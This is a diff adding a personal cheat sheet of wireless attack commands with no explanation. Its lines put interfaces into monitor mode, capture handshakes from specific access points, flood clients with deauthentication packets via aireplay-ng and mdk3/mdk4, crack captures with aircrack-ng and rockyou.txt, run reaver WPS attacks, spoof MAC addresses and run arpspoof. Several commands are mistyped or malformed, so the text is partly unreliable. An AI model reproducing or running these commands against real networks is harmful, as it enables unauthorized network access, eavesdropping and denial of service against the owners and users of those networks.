@@ -1,0 +1,119 @@
+sudo ifconfig wlan0 down
+sudo iwconfig wlan0 mode monitor
+sudo ifconfig wlan0 up
+sudo iwconfig wlan0
+airodump-ng wlan0
+ifconfig eth0
+
+airodump-ng -c 10 --bssid 50:0F:F5:D0:94:C8 wlan1    58:7F:66:7D:0F:50  192.168.1.103  255.255.255.0 - 192.168.1.255
+
+
+ 50:0F:F5:D0:94:C8  14:56:8E:06:22:C1   -1    5e- 0      0        2                                                        
+
+airodump-ng -c 1 --write latesthackingnews --bssid 50:0F:F5:D0:94:C8 wlan0
+
+airodump-ng -c 1 --bssid 84:16:F9:88:56:B8 wlan0
+
+50:0F:F5:D0:94:C8 --deauth 5-a 50:0F:F5:D0:94:C8 -c 48:2C:A0:E8:92:5B
+
+wlan0
+airodump-ng -c 9 --bssid 84:16:F9:88:56:B8 -w mariam55 wlan1mon
+
+
+aireplay-ng -0 0 -a 84:16:F9:88:56:B8 wlan1
+
+aircrack-ng -w >wordlist> rockyou.txt .b 48:2C:A0:E8:92:5B latesthackingnews -01 .cap
+
+aircrack-ng mariam55.cap -w /root/key/rockyou.txt
+
+reaver -i wlan0mon -b B0:4E:26:B9:55:6C -c 1 -vv
+airodump-ng --bssid 84:16:F9:88:56:B8 wlan1
+
+
+airmon-ng start wlan0
+
+airodump-ng -c 1 --bssid B0:4E:26:B9:55:6C -w adam1122 wlan0mon
+
+
+-------------------------------------------------
+
+airodump-ng -c 1 --bssid B0:4E:26:B9:55:6C wlxe84e064bc8b8                   zid <
+
+airodump-ng -c 6 --bssid 10:FE:ED:71:8D:8C wlxe84e064bc8b8                     zid<
+
+airodump-ng -c 2 --bssid 68:72:51:50:60:D0 wlxe84e064bc8b8                    zid<
+
+airodump-ng -c 5 --bssid EC:08:6B:A8:70:59 wlxe84e064bc8b8 wlan0mon
+
+
+airodump-ng -c 5 --bssid 68:72:51:22:17:4A wlxe84e064bc8b8
+
+-----------------------------------------------
+usage: airmon-ng <start|stop|check> <interface> [channel or frequency]
+
+echo "iface eth0 inet dhcp" >> /etc/network/interfaces
+
+
+https://marc.info/?l=linux-wireless
+
+wget http://linuxwireless.sipsolutions.net/download/compat-wireless-2.6/compat-wireless-2010-06-26-p.tar.bz2
+
+airodump-ng -c 7 --bssid 84:16:F9:88:56:B8 -w marim wlan0mon
+aireplay-ng -0 2 -a C4:6E:1F:58:81:B6 -c 3E:D1:D9:3A:70:F2 wlan1mon
+
+airodump-ng wlan0mon
+ircrack-ng adam-01.cap -w
+airodump-ng --bssid 84:16:F9:88:56:B8 wlan1
+aircrack-ng mariam55-01.cap -w /root/key/k.
+
+#cat# 
+aireplay-ng -0 5 -a 00:18:DE:74:61:EE -c B0:4E:26:B9:55:6C wlan1
+
+airodump-ng --bssid 84:16:F9:88:56:B8 -c 7 -w adam mon1
+aireplay-ng  -0 5 a- 84:16:F9:88:56:B8
+aireplay-ng --deauth 1000 -a B0:4E:26:B9:55:6C wlan1mon 
+aireplay-ng --deauth 1000 -a  B0:4E:26:B9:55:6C -c 68:E7:C2:4B:99:7D  wlan1          
+
+--------------------------------------
+       macchanger
+-------------------------------------
+ifconfig eth0 up                                         14:9F:3C:FA:B9:09
+ifconfig eth0
+macchanger -mac A4:07:B6:03:03:D1 eth0                                        68:E7:C2:4B:99:7D
+ macchanger -m 50:FC:9F:D5:4E:83 eth0
+  macchanger -m E8:4E:06:4B:C8:B8 eth0                   macchanger -m 14:9F:3C:FA:B9:09            24:0D:C2:E5:7C:2F - D0:F8:8C:7B:C8:7F
+   macchanger -m FC:DB:B3:67:93:9B
+
+-----------------------------------------
+mdk
+touch mac-list.txt
+mdk mon1 d -b mac-list.txt -c 1
+mdk3 wlan1mon d -b mac-list.txt -c 5
+mdk3 wlan1 a
+mdk3 wlan1 d
+mdk3 wlan1 d -b /root/mac-list.txt. -c 1
+mdk3 wlan1 a -m -1 B0:4E:26:B9:55:6C
+mdk3 wlan1  a -a B0:4E:26:B9:55:6C
+
+========================================================
+mdk4 wlan1 b -f /root/mac-list.txt.save -c 1
+mdk4 wlan1  b -c 1 -f /root/mac-list.txt.save
+
+
+==================================
+arpspoof
+arpspoof -i wlan0 10.765799.876788
+
+spoof-mac.py set D0:F8:8C:7B:C8:7F wlan0
+
+
+service network-manager restart
+
+
+=====================================
+pyrit -r hs/handshake_EBRALI_64-70-02-46-F6-2E_2020-03-23T20-10-28.cap-0 analyze
+
+=================================
+aircrack-ng -w /root/سطح المكتب/وصلة إلى kali liunx/Downloads/rockyou.txt 2020-02.cap
+
+
